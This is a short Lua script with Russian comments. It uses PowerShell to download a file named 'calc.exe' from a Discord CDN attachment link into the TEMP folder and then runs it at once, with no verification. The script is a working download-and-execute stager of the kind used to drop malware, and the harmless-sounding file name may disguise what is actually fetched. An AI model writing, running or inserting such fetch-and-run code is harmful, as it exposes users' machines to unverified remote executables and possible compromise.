local url = "https://cdn.discordapp.com/attachments/1395213097630695554/1438240569422909641/calc.exe"
local temp_dir = os.getenv("TEMP") or "C:\\Temp"
local file_path = temp_dir .. "\\calc.exe"

-- Функция загрузки файла через PowerShell
local function download_file()
    local command = string.format('powershell -Command "Invoke-WebRequest -Uri \'%s\' -OutFile \'%s\'"', url, file_path)
    local result = os.execute(command)
    
    if result == 0 or result == true then
        print("Файл успешно загружен: " .. file_path)
        return true
    else
        print("Ошибка загрузки файла")
        return false
    end
end

-- Загрузка и запуск файла
if download_file() then
    print("Запускаем файл...")
    os.execute('"' .. file_path .. '"')
else
    print("Не удалось загрузить файл")
end